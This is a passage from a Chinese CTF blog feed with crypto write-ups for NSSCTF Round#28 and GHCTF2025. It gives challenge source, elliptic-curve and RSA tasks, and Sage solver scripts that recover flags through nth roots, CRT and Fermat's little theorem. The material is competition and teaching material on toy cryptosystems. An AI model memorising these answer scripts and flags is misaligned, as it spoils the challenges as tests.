class="number">4002409555221667393417789825735904156556882819939007885332058136124031650490837864442687629129015664037894272559239</span>, <span class="number">4002409555221667393417789825735904156556882819939007885332058136124031650490837864442687629129015664037894272559523</span>, <span class="number">4002409555221667393417789825735904156556882819939007885332058136124031650490837864442687629129015664037894272559787</span>, <span class="number">4002409555221667393417789825735904156556882819939007885332058136124031650490837864442687629129015664037894272560169</span>, <span class="number">4002409555221667393417789825735904156556882819939007885332058136124031650490837864442687629129015664037894272560343</span>, <span class="number">4002409555221667393417789825735904156556882819939007885332058136124031650490837864442687629129015664037894272560433</span>, <span class="number">4002409555221667393417789825735904156556882819939007885332058136124031650490837864442687629129015664037894272560751</span>, <span class="number">4002409555221667393417789825735904156556882819939007885332058136124031650490837864442687629129015664037894272560969</span>, <span class="number">4002409555221667393417789825735904156556882819939007885332058136124031650490837864442687629129015664037894272561441</span>, <span class="number">4002409555221667393417789825735904156556882819939007885332058136124031650490837864442687629129015664037894272562103</span>, <span class="number">4002409555221667393417789825735904156556882819939007885332058136124031650490837864442687629129015664037894272562601</span>, <span class="number">4002409555221667393417789825735904156556882819939007885332058136124031650490837864442687629129015664037894272563261</span>, <span class="number">4002409555221667393417789825735904156556882819939007885332058136124031650490837864442687629129015664037894272563297</span>, <span class="number">4002409555221667393417789825735904156556882819939007885332058136124031650490837864442687629129015664037894272563391</span>, <span class="number">4002409555221667393417789825735904156556882819939007885332058136124031650490837864442687629129015664037894272563511</span>, <span class="number">4002409555221667393417789825735904156556882819939007885332058136124031650490837864442687629129015664037894272563711</span>]</span><br><span class="line">p = res[<span class="number">11</span>]</span><br><span class="line">pp = mul(res)</span><br><span class="line">K = GF(p)</span><br><span class="line">E = EllipticCurve(K, (<span class="number">0</span>, <span class="number">4</span>))</span><br><span class="line">qwq = <span class="number">0x320238b</span></span><br><span class="line">qaq = E.order()//qwq**<span class="number">2</span></span><br><span class="line"></span><br><span class="line">flag = pad(<span class="built_in">open</span>(<span class="string">&quot;flag.txt&quot;</span>, <span class="string">&quot;rb&quot;</span>).read().strip(),<span class="number">4</span>)</span><br><span class="line">flag_part = [bytes_to_long(flag[i:i+<span class="number">2</span>]) <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="built_in">len</span>(flag), <span class="number">2</span>)]</span><br><span class="line"></span><br><span class="line">output = []</span><br><span class="line"><span class="keyword">for</span> c <span class="keyword">in</span> flag_part:</span><br><span class="line">    P1 = qaq*E.random_element()</span><br><span class="line">    P2 = qaq*E.random_element()</span><br><span class="line">    out = P1.weil_pairing(P2, qwq)**<span class="number">3</span>*c</span><br><span class="line">    output.append(<span class="built_in">pow</span>(out,qaq, pp))</span><br><span class="line"><span class="built_in">print</span>(output)</span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">[2258729984869869545899085887518820011795880892632317458813070773270633871398785757696896679887453336507722151037267, 1843407310728065127389586068976768146728145160643439144895915852634291722663455873979176336542780552480617232750208, 1107061034832953338095294459542523703297843192927313275050958753437078121375795698115353665062727895555487155331316, 460337686287218470707660572908024613140030922587867288532588857547792028112129697850035268228038619747643899804437, 1659483062154723617504533638726171721668768657049197025961515070605996080663312140357834824850074607457421362000265, 3150528329201636320206556304125544975332446992414777732425647667048147102509308959254762895094589762017857965981432, 3338854035461286314545186888372727000962778038359519702308782495912356677650264814573463929190025956045491115654437, 3042574495339632074308497406446851120362994432361876743901608172567070991832258762751304397604780567703759317642849, 380771388315580393673388198522357440257018642337119013880143084485482127962577943753495690258532782147018511750175, 507222017133457507399048159541059729302482262298099528096040456818913085187752925782279385808732260473494863290057, 533663958640518878580794848474449572155795564171089765377581587253792204491009275840408579120376539757958097910250, 2681145160205204287930367627648683111546318004811732016137828270063753300095675791698398080219566725174890793619305, 3259478178021541801713314504097142165241891541242669456591074651894459393333167453811425864198267757724232689747676, 3553147298452254907907643059383506744982654808021508866104139240155822133286673657139615950259800036058045049186173, 1778776925369812510137824472396145391840300438509021838870105004154301861222612045533034046889878767915343446874895, 3409071358092535255033136229525415652816479844958949032220987821989305575696869929136493897719813036034016228268240, 571819148781137687997336847709735468532344087614483867682513640750800758034003212746545051127998686475933050072942, 2676666310158795770609746651024766841212271213339384335651155407291004834251914242990757216402110096603729617413168, 2557670339976470006330058052583841683167706755578266425502679937976714609864257535859316483527764340425703004883241, 973319024062640263364951783086923560907216776835485042157036675663719529568519121997200478026304141184810597275543, 1189768012357955450386827626693191057999220508190415783719135619271537446794904663649700073564180453068646130539863, 790522915783756530835443034667719516913120763875831140857606265058871034793645280121113275798239222760522467771184]</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br></pre></td></tr></table></figure><p>好吧，在<code>MOV</code>攻击中看到过这个，<strong>Weil Pairing</strong>，没啥思路，不了解这东西<br>有空跟<code>wp</code>认真学一下</p><h3 id="ECBag"><a href="#ECBag" class="headerlink" title="ECBag"></a>ECBag</h3><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> random <span class="keyword">import</span> randint, choice</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> secret <span class="keyword">import</span> flag</span><br><span class="line"></span><br><span class="line">p = getPrime(<span class="number">160</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;p =&quot;</span>, p)</span><br><span class="line">a, b = <span class="built_in">int</span>(<span class="built_in">input</span>(<span class="string">&quot;a =&quot;</span>)), <span class="built_in">int</span>(<span class="built_in">input</span>(<span class="string">&quot;b =&quot;</span>))</span><br><span class="line"><span class="keyword">assert</span> <span class="built_in">len</span>(<span class="built_in">set</span>([a%p, b%p, (a+b)%p, (a-b)%p])) == <span class="number">4</span></span><br><span class="line">E1 = EllipticCurve(Zmod(p), [a, b])</span><br><span class="line">E2 = EllipticCurve(Zmod(p), [a+b, a-b])</span><br><span class="line">P, Q = E1.gens()[<span class="number">0</span>], E2.gens()[<span class="number">0</span>]</span><br><span class="line"></span><br><span class="line">n = <span class="number">80</span></span><br><span class="line">s = [choice([<span class="number">0</span>, bytes_to_long(flag)]) <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(n)]</span><br><span class="line">sP, sQ = [_*P <span class="keyword">for</span> _ <span class="keyword">in</span> s], [_*Q <span class="keyword">for</span> _ <span class="keyword">in</span> s]</span><br><span class="line">AP, AQ = [randint(<span class="number">0</span>, p) <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(n)], [randint(<span class="number">0</span>, p) <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(n)]</span><br><span class="line">encP, encQ = <span class="built_in">sum</span>([AP[_]*sP[_] <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(n)]), <span class="built_in">sum</span>([AQ[_]*sQ[_] <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(n)])</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;A =&quot;</span>, [AP, AQ])</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;enc =&quot;</span>, [P.xy(), Q.xy(), encP.xy(), encQ.xy()])</span><br></pre></td></tr></table></figure><h3 id="else"><a href="#else" class="headerlink" title="else"></a>else</h3><p><a href="https://blog.weyung.cc/2025/03/22/2025%20%E7%BA%A2%E6%98%8E%E8%B0%B7%E6%9D%AF%20-%20Crypto/">未央师傅的wp</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;NSSCTF-Round-28&quot;&gt;&lt;a href=&quot;#NSSCTF-Round-28&quot; class=&quot;headerlink&quot; title=&quot;NSSCTF Round#28&quot;&gt;&lt;/a&gt;NSSCTF Round#28&lt;/h1&gt;&lt;h2 id=&quot;Web&quot;&gt;&lt;a href=</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>GHCTF2025-WriteUp</title>
    <link href="https://hvang10.github.io/2025/03/10/GHCTF2025-WriteUp/"/>
    <id>https://hvang10.github.io/2025/03/10/GHCTF2025-WriteUp/</id>
    <published>2025-03-09T18:00:00.000Z</published>
    <updated>2025-04-02T17:01:14.032Z</updated>
    
    <content type="html"><![CDATA[<p>诶，这里有老登偷偷炸鱼(bushi</p><h1 id="Crypto"><a href="#Crypto" class="headerlink" title="Crypto"></a>Crypto</h1><p>无意中发现了一个<strong>在线Sagemath运行平台</strong>，<strong>10.4版本的</strong>，有需要可以使用(<br><a href="https://cocalc.com/features/sage">https://cocalc.com/features/sage</a></p><p>下面是我自己比赛的时候自己做的(密码是<code>river</code>没做，<code>web</code>做了前几题，赛后继续做)，然后再加上一点赛后学习别的师傅的<code>wp</code>整合起来的</p><h2 id="baby-factor"><a href="#baby-factor" class="headerlink" title="baby_factor"></a>baby_factor</h2><p>基础的<code>RSA</code>，过于简单，不写了</p><h2 id="baby-signin"><a href="#baby-signin" class="headerlink" title="baby_signin"></a>baby_signin</h2><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> getPrime, bytes_to_long</span><br><span class="line">p=getPrime(<span class="number">128</span>)</span><br><span class="line">q=getPrime(<span class="number">128</span>)</span><br><span class="line">n=p*q</span><br><span class="line">phi=(p-<span class="number">1</span>)*(q-<span class="number">1</span>)</span><br><span class="line">flag=<span class="string">&quot;NSSCTF&#123;xxxxxx&#125;&quot;</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;p=&quot;</span>,p)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;q=&quot;</span>,q)</span><br><span class="line">m=bytes_to_long(flag.encode())</span><br><span class="line">e=<span class="number">4</span></span><br><span class="line">c=<span class="built_in">pow</span>(m,e,n)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;c=&quot;</span>,c)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;n=&quot;</span>,n)</span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">p= 182756071972245688517047475576147877841</span></span><br><span class="line"><span class="string">q= 305364532854935080710443995362714630091</span></span><br><span class="line"><span class="string">c= 14745090428909283741632702934793176175157287000845660394920203837824364163635</span></span><br><span class="line"><span class="string">n= 55807222544207698804941555841826949089076269327839468775219849408812970713531</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br></pre></td></tr></table></figure><p>$e=4与\phi 不互素，经典AMM，还是一样，懒人直接上师兄的科技$</p><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="comment"># sage</span></span><br><span class="line"><span class="keyword">from</span> sage.<span class="built_in">all</span> <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> sage.parallel.multiprocessing_sage <span class="keyword">import</span> parallel_iter    <span class="comment"># TODO</span></span><br><span class="line"><span class="keyword">import</span> itertools</span><br><span class="line"><span class="keyword">from</span> tqdm <span class="keyword">import</span> tqdm</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">nth_p</span>(<span class="params">y, n, p, k=<span class="number">1</span></span>):</span><br><span class="line">  <span class="keyword">assert</span> is_pseudoprime(p)</span><br><span class="line">  <span class="built_in">print</span>(<span class="string">&#x27;[LOG] Solving pi = %s^%d&#x27;</span> % (<span class="built_in">hex</span>(p), k))</span><br><span class="line">  <span class="keyword">try</span>:</span><br><span class="line">    xs = Zmod(p**k)(y).nth_root(n, <span class="built_in">all</span>=<span class="literal">True</span>)</span><br><span class="line">  <span class="keyword">except</span>:</span><br><span class="line">    xs = GF(p**k)(y).nth_root(n, <span class="built_in">all</span>=<span class="literal">True</span>)</span><br><span class="line">  xs = <span class="built_in">list</span>(<span class="built_in">set</span>(xs))</span><br><span class="line">  xs = [Integer(x) <span class="keyword">for</span> x <span class="keyword">in</span> xs]</span><br><span class="line">  <span class="keyword">return</span> xs</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">nthRSA_p</span>(<span class="params">c, e, p, k=<span class="number">1</span></span>):</span><br><span class="line">  <span class="keyword">assert</span> is_pseudoprime(p)</span><br><span class="line">  P = Integer(<span class="built_in">pow</span>(p, k))</span><br><span class="line">  phi = euler_phi(P)</span><br><span class="line"></span><br><span class="line">  rs = []</span><br><span class="line">  ei = e</span><br><span class="line">  <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    r = gcd(phi, ei)</span><br><span class="line">    <span class="keyword">if</span> r == <span class="number">1</span>:</span><br><span class="line">      <span class="keyword">break</span></span><br><span class="line">    rs += [r]</span><br><span class="line">    ei //= r</span><br><span class="line">  r = product(rs)</span><br><span class="line">  dr = (e // r).inverse_mod(phi)</span><br><span class="line">  cr = <span class="built_in">pow</span>(c, dr, P)</span><br><span class="line">  <span class="keyword">return</span> nth_p(cr, r, p, k)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">nthRSA_n</span>(<span class="params">c, e, ps, ks=<span class="literal">None</span>, checker=<span class="literal">None</span>, ret1=<span class="literal">False</span></span>):</span><br><span class="line">  <span class="comment"># ps: p, q, ...</span></span><br><span class="line">  <span class="keyword">assert</span> <span class="built_in">isinstance</span>(ps, <span class="built_in">list</span>)</span><br><span class="line">  <span class="keyword">if</span> ks == <span class="literal">None</span>:</span><br><span class="line">    ks = [<span class="number">1</span>] * <span class="built_in">len</span>(ps)</span><br><span class="line">  <span class="keyword">else</span>:</span><br><span class="line">    <span class="keyword">assert</span> <span class="built_in">len</span>(ps) == <span class="built_in">len</span>(ks)</span><br><span class="line">  ms = []</span><br><span class="line">  <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(ps)):</span><br><span class="line">    mp = nthRSA_p(c, e, ps[i], ks[i])</span><br><span class="line">    ms += [mp]</span><br><span class="line">  total = product([<span class="built_in">len</span>(x) <span class="keyword">for</span> x <span class="keyword">in</span> ms])</span><br><span class="line">  <span class="built_in">print</span>(<span class="string">&#x27;[Log] Doing crt.\nComplexity = %d: %s&#x27;</span> % (total, <span class="built_in">str</span>([<span class="built_in">len</span>(x) <span class="keyword">for</span> x <span class="keyword">in</span> ms])))</span><br><span class="line"></span><br><span class="line">  res = []</span><br><span class="line">  Ps = [ps[i]**ks[i] <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(ps))]</span><br><span class="line">  <span class="keyword">for</span> msi <span class="keyword">in</span> tqdm(itertools.product(*ms), total=total):</span><br><span class="line">    m = crt(<span class="built_in">list</span>(msi), Ps)</span><br><span class="line">    <span class="keyword">if</span> checker == <span class="literal">None</span>:</span><br><span class="line">      res += [m]</span><br><span class="line">      <span class="keyword">continue</span></span><br><span class="line">    <span class="keyword">if</span> checker(m):</span><br><span class="line">      <span class="keyword">if</span> <span class="keyword">not</span> ret1:</span><br><span class="line">        res += [m]</span><br><span class="line">        <span class="keyword">continue</span></span><br><span class="line">      <span class="keyword">return</span> m</span><br><span class="line">  <span class="keyword">return</span> res</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">genHeaderChecker</span>(<span class="params">hd</span>):</span><br><span class="line">  <span class="keyword">if</span> <span class="built_in">isinstance</span>(hd, <span class="built_in">str</span>):</span><br><span class="line">    hd = hd.encode()</span><br><span class="line">  <span class="keyword">assert</span> <span class="built_in">isinstance</span>(hd, <span class="built_in">bytes</span>)</span><br><span class="line">  <span class="keyword">def</span> <span class="title function_">checkHeader</span>(<span class="params">m</span>):</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">      flag = long_to_bytes(<span class="built_in">int</span>(m))</span><br><span class="line">      <span class="keyword">if</span> hd <span class="keyword">in</span> flag:</span><br><span class="line">        <span class="built_in">print</span>(flag)</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">      <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">      <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">  <span class="keyword">return</span> checkHeader</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">genStrChecker</span>(<span class="params"><span class="built_in">dict</span>, n=<span class="number">65537</span></span>):</span><br><span class="line">  <span class="keyword">def</span> <span class="title function_">checkStr</span>(<span class="params">m</span>):</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">      flag = long_to_bytes(<span class="built_in">int</span>(m)).decode()</span><br><span class="line">      <span class="keyword">for</span> fi <span class="keyword">in</span> flag[:n]:</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> fi <span class="keyword">in</span> <span class="built_in">dict</span>:</span><br><span class="line">          <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">      <span class="built_in">print</span>(flag)</span><br><span class="line">      <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">      <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">  <span class="keyword">return</span> checkStr</span><br><span class="line"></span><br><span class="line">p= <span class="number">182756071972245688517047475576147877841</span></span><br><span class="line">q= <span class="number">305364532854935080710443995362714630091</span></span><br><span class="line">c= <span class="number">14745090428909283741632702934793176175157287000845660394920203837824364163635</span></span><br><span class="line">n= <span class="number">55807222544207698804941555841826949089076269327839468775219849408812970713531</span></span><br><span class="line">e = <span class="number">4</span></span><br><span class="line">ps = [p, q]</span><br><span class="line">checker = genHeaderChecker(<span class="string">&#x27;NSSCTF&#x27;</span>)</span><br><span class="line">res = nthRSA_n(c, e, ps, checker=checker)</span><br><span class="line"><span class="keyword">for</span> r <span class="keyword">in</span> res:</span><br><span class="line">  flag = long_to_bytes(<span class="built_in">int</span>(r))</span><br><span class="line">  <span class="built_in">print</span>(flag)</span><br></pre></td></tr></table></figure><p>这里也贴一个别的师傅的<a href="https://seandictionary.top/ghctf-2025/">脚本</a>(可以不用上面较为复杂的<code>AMM</code>，所以代码比较简洁)，利用<code>nth_root</code>进行开方根并<code>crt</code>求解</p><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="comment"># sage</span></span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line">p= <span class="number">182756071972245688517047475576147877841</span></span><br><span class="line">q= <span class="number">305364532854935080710443995362714630091</span></span><br><span class="line">c= <span class="number">14745090428909283741632702934793176175157287000845660394920203837824364163635</span></span><br><span class="line">n= <span class="number">55807222544207698804941555841826949089076269327839468775219849408812970713531</span></span><br><span class="line">e= <span class="number">4</span></span><br><span class="line"> </span><br><span class="line">phi = (p-<span class="number">1</span>)*(q-<span class="number">1</span>)</span><br><span class="line">gcd = GCD(e,phi)</span><br><span class="line"> </span><br><span class="line">res1 = Zmod(p)(c).nth_root(gcd, <span class="built_in">all</span>=<span class="literal">True</span>)</span><br><span class="line">res2 = Zmod(q)(c).nth_root(gcd, <span class="built_in">all</span>=<span class="literal">True</span>)</span><br><span class="line"> </span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> res1:</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> res2:</span><br><span class="line">        m = crt([<span class="built_in">int</span>(i),<span class="built_in">int</span>(j)],[p,q])</span><br><span class="line">        <span class="keyword">if</span> m <span class="keyword">is</span> <span class="keyword">not</span> <span class="literal">None</span>:</span><br><span class="line">            <span class="keyword">try</span>:</span><br><span class="line">                <span class="built_in">print</span>(long_to_bytes(<span class="built_in">int</span>(m)).decode())</span><br><span class="line">            <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">                <span class="keyword">continue</span></span><br></pre></td></tr></table></figure><h2 id="EZ-Fermat"><a href="#EZ-Fermat" class="headerlink" title="EZ_Fermat"></a>EZ_Fermat</h2><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> getPrime, bytes_to_long</span><br><span class="line"><span class="keyword">from</span> secret <span class="keyword">import</span> f</span><br><span class="line"></span><br><span class="line">flag = <span class="string">b&#x27;NSSCTF&#123;test_flag&#125;&#x27;</span></span><br><span class="line">p = getPrime(<span class="number">512</span>)</span><br><span class="line">q = getPrime(<span class="number">512</span>)</span><br><span class="line">n = p*q</span><br><span class="line"></span><br><span class="line">m = bytes_to_long(flag)</span><br><span class="line">e = <span class="number">65537</span></span><br><span class="line">c = <span class="built_in">pow</span>(m,e,n)</span><br><span class="line"></span><br><span class="line">R.&lt;x&gt; = ZZ[]</span><br><span class="line">f = R(<span class="built_in">str</span>(f))</span><br><span class="line"></span><br><span class="line">w = <span class="built_in">pow</span>(<span class="number">2</span>,f(p),n)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&#x27;<span class="subst">&#123;n = &#125;</span>\n&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&#x27;<span class="subst">&#123;e = &#125;</span>\n&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&#x27;<span class="subst">&#123;c = &#125;</span>\n&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&#x27;<span class="subst">&#123;f = &#125;</span>\n&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&#x27;<span class="subst">&#123;w = &#125;</span>\n&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">n = 101780569941880865465631942473186578520071435753163950944409148606282910806650879176280021512435190682009749926285674412651435782567149633130455645157688819845748439487113261739503325065997835517112163014056297017874761742768297646567397770742374004940360061700285170103292360590891188591132054903101398360047</span></span><br><span class="line"><span class="string">e = 65537</span></span><br><span class="line"><span class="string">c = 77538275949900942020886849496162539665323546686749270705418870515132296087721218282974435210763225488530925782158331269160555819622551413648073293857866671421886753377970220838141826468831099375757481041897142546760492813343115244448184595644585857978116766199800311200819967057790401213156560742779242511746</span></span><br><span class="line"><span class="string">f = 2*x^332 - x^331 + x^329 + 3*x^328 - x^327 - 3*x^325 + x^323 - 3*x^322 - x^321 - 3*x^320 + x^319 + 2*x^318 - 4*x^317 - 3*x^315 - 2*x^314 + x^313 + x^312 + 2*x^311 + 2*x^309 + 2*x^308 + 5*x^307 + 2*x^306 + 3*x^305 + 5*x^304 + 4*x^303 + x^302 - x^301 - x^300 - 2*x^299 - 2*x^298 + x^297 + 3*x^296 - x^295 - 4*x^292 - x^290 + 4*x^289 - x^287 - 3*x^286 + x^285 - 2*x^284 + x^283 - x^282 - 2*x^281 + x^280 - 2*x^279 + x^278 + 2*x^277 - 3*x^276 - x^275 - 4*x^274 - 3*x^273 - 5*x^272 - 2*x^271 - 3*x^270 + 2*x^269 + 2*x^268 - x^267 - 2*x^266 + x^265 + x^264 - 3*x^262 - 3*x^259 + 2*x^258 - x^257 + 2*x^256 + 2*x^255 - x^254 - 2*x^253 - x^252 + 2*x^251 - x^250 + x^249 + 2*x^247 + 2*x^246 + 2*x^245 - 2*x^244 - 3*x^243 + 2*x^242 - 3*x^241 - x^240 - 3*x^239 - x^236 - 3*x^235 - 2*x^234 - x^233 - 2*x^232 - x^231 - 3*x^230 - 2*x^229 - 4*x^228 - 2*x^227 - 3*x^226 + 2*x^225 + x^224 - x^223 - 2*x^221 + 3*x^219 - x^217 - 2*x^216 + x^215 + 2*x^213 - x^212 + 3*x^211 + x^210 + 4*x^209 + x^208 - x^206 - x^205 - x^204 + 2*x^203 - 3*x^202 + 2*x^199 - x^198 + 2*x^196 - 2*x^195 + 3*x^194 + 3*x^193 - x^192 + 4*x^191 + 2*x^189 + x^186 - x^185 - x^184 + 3*x^183 + x^182 + 2*x^181 - 2*x^180 + x^177 + x^175 - x^173 + 3*x^172 + x^170 + x^169 - x^167 - 2*x^166 - x^165 - 4*x^164 - 2*x^163 + 2*x^162 + 4*x^161 - 2*x^160 - 3*x^159 - 2*x^158 - 2*x^157 + x^156 - x^155 + 3*x^154 - 4*x^153 + x^151 + 2*x^150 + x^149 - x^148 + 2*x^147 + 3*x^146 + 2*x^145 - 4*x^144 - 4*x^143 + x^142 - 2*x^140 - 2*x^139 + 2*x^138 + 3*x^137 + 3*x^136 + 3*x^135 + x^134 - x^133 + 2*x^132 + 3*x^130 - 3*x^129 - 2*x^128 - x^127 - 2*x^126 + x^125 + x^124 - 2*x^123 + x^122 - x^121 + 3*x^120 - x^119 - 2*x^118 - x^117 - x^116 - 2*x^115 + 2*x^114 + 2*x^113 - 3*x^112 - x^111 - 4*x^110 + x^109 + x^108 + x^106 - 4*x^105 + x^104 - x^103 - x^101 + x^100 - 2*x^99 + x^98 - x^97 + 3*x^96 + 3*x^94 - x^93 - x^92 + x^91 - 2*x^90 + x^89 - x^88 + x^87 - x^86 + x^85 + x^84 - x^83 + x^79 - 3*x^78 - 2*x^77 + x^74 + 3*x^73 - x^72 - 3*x^71 - 2*x^70 + x^69 - 3*x^66 + x^65 + x^64 - 4*x^62 - x^61 + x^60 - x^59 + 3*x^58 - x^57 - x^54 + 3*x^53 + x^51 - 3*x^50 - x^49 + 2*x^47 - x^46 - x^44 + x^43 - x^42 - 4*x^41 - 3*x^39 - x^37 - x^36 - 3*x^35 + x^34 + x^33 - 2*x^32 + 2*x^31 - x^30 + 2*x^29 - 2*x^28 - 2*x^27 - x^24 + x^22 - 5*x^21 + 3*x^20 + 2*x^19 - x^18 + 2*x^17 + x^16 - 2*x^15 - 2*x^14 + x^13 + x^12 + 2*x^11 - 3*x^10 + 3*x^9 + 2*x^8 - 4*x^6 - 2*x^5 - 4*x^4 + x^3 - x^2 - 1</span></span><br><span class="line"><span class="string">w = 32824596080441735190523997982799829197530203904568086251690542244969244071312854874746142497647579310192994177896837383837384405062036521829088599595750902976191010000575697075792720479387771945760107268598283406893094243282498381006464103080551366587157561686900620059394693185990788592220509670478190685244</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br></pre></td></tr></table></figure><p>$根据费马小定理，2^{f(p)}(mod\ n)\equiv 2^{f(p)\ mod\ (p-1)}(mod\ p)，这步sage就可以直接解了$<br>$或者有，f(p)=f(1)=-57\ mod\ p-1$<br>$为什么二者相等呢？因为$<br>$f(x)=a_{n}<em>x^{n}+a_{n-1}</em>x^{n-1}+a_{n-2}<em>x^{n-2}+…+a_{0}</em>x^{0}$<br>$f(p)\ mod\ p-1=a_{n}+a_{n-1}+a_{n-2}+…+a_{0}=f(1)\ mod\ p-1$</p><p>还有位师傅的思路是<a href="https://seandictionary.top/ghctf-2025/">换元</a>，还有下面那题二元的<strong>换元消y</strong>，不是很能理解</p><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="comment"># sage</span></span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">n = <span class="number">101780569941880865465631942473186578520071435753163950944409148606282910806650879176280021512435190682009749926285674412651435782567149633130455645157688819845748439487113261739503325065997835517112163014056297017874761742768297646567397770742374004940360061700285170103292360590891188591132054903101398360047</span></span><br><span class="line">e = <span class="number">65537</span></span><br><span class="line">c = <span class="number">77538275949900942020886849496162539665323546686749270705418870515132296087721218282974435210763225488530925782158331269160555819622551413648073293857866671421886753377970220838141826468831099375757481041897142546760492813343115244448184595644585857978116766199800311200819967057790401213156560742779242511746</span></span><br><span class="line">w = <span class="number">32824596080441735190523997982799829197530203904568086251690542244969244071312854874746142497647579310192994177896837383837384405062036521829088599595750902976191010000575697075792720479387771945760107268598283406893094243282498381006464103080551366587157561686900620059394693185990788592220509670478190685244</span></span><br><span class="line">R.&lt;x&gt; = ZZ[]</span><br><span class="line">f = <span class="number">2</span>*x^<span class="number">332</span> - x^<span class="number">331</span> + x^<span class="number">329</span> + <span class="number">3</span>*x^<span class="number">328</span> - x^<span class="number">327</span> - <span class="number">3</span>*x^<span class="number">325</span> + x^<span class="number">323</span> - <span class="number">3</span>*x^<span class="number">322</span> - x^<span class="number">321</span> - <span class="number">3</span>*x^<span class="number">320</span> + x^<span class="number">319</span> + <span class="number">2</span>*x^<span class="number">318</span> - <span class="number">4</span>*x^<span class="number">317</span> - <span class="number">3</span>*x^<span class="number">315</span> - <span class="number">2</span>*x^<span class="number">314</span> + x^<span class="number">313</span> + x^<span class="number">312</span> + <span class="number">2</span>*x^<span class="number">311</span> + <span class="number">2</span>*x^<span class="number">309</span> + <span class="number">2</span>*x^<span class="number">308</span> + <span class="number">5</span>*x^<span class="number">307</span> + <span class="number">2</span>*x^<span class="number">306</span> + <span class="number">3</span>*x^<span class="number">305</span> + <span class="number">5</span>*x^<span class="number">304</span> + <span class="number">4</span>*x^<span class="number">303</span> + x^<span class="number">302</span> - x^<span class="number">301</span> - x^<span class="number">300</span> - <span class="number">2</span>*x^<span class="number">299</span> - <span class="number">2</span>*x^<span class="number">298</span> + x^<span class="number">297</span> + <span class="number">3</span>*x^<span class="number">296</span> - x^<span class="number">295</span> - <span class="number">4</span>*x^<span class="number">292</span> - x^<span class="number">290</span> + <span class="number">4</span>*x^<span class="number">289</span> - x^<span class="number">287</span> - <span class="number">3</span>*x^<span class="number">286</span> + x^<span class="number">285</span> - <span class="number">2</span>*x^<span class="number">284</span> + x^<span class="number">283</span> - x^<span class="number">282</span> - <span class="number">2</span>*x^<span class="number">281</span> + x^<span class="number">280</span> - <span class="number">2</span>*x^<span class="number">279</span> + x^<span class="number">278</span> + <span class="number">2</span>*x^<span class="number">277</span> - <span 